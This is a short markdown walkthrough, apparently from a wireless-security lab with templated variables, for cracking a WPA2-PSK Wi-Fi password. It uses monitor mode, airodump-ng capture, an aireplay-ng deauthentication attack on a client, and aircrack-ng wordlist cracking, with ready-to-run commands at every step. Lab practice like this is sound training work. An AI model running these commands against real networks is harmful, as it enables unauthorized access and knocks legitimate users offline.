# WPA2-PSK cracking with Accesspoint (same for WPA-PSK)

[//]: # ({ wlan: 'wlan0', channel: 6, apmac: 'D2:E9:6A:D3:B3:50', clientmac: '02:00:00:00:02:00', filename: 'test', passwordsFile: '100-common-passwords.txt' })

## See what wifi devices we have

```bash
iw dev
```

## We find wlan0 and set it to monitor mode

```bash
ip link set ${wlan} down
iw dev ${wlan} set type monitor
ip link set ${wlan} up
```

## Now we scan to see what is available:

```bash
airodump-ng --band abg ${wlan}
```

## We find an Access point, (Mac: D2:E9:6A:D3:B3:50), that we'd like to attack on channel 6, along with a client, (Mac: 02:00:00:00:02:00), so we start a dump to a set of files prefixed by 'test'

```bash
airodump-ng --band abg ${wlan} --channel ${channel} -w ${filename}
``` 

Which will save the output to a file named test.

## In a separate terminal, we do a deauth attack:

```bash
aireplay-ng -a ${apmac} --deauth 1 -c ${clientmac} ${wlan}
```

And when the handshake has been captured, we close the airodump session.

## Next we use aircrack to find the password from a wordlist:

```bash
aircrack-ng -w ${passwordsFile} ${filename}-01.cap
```

We now have the password.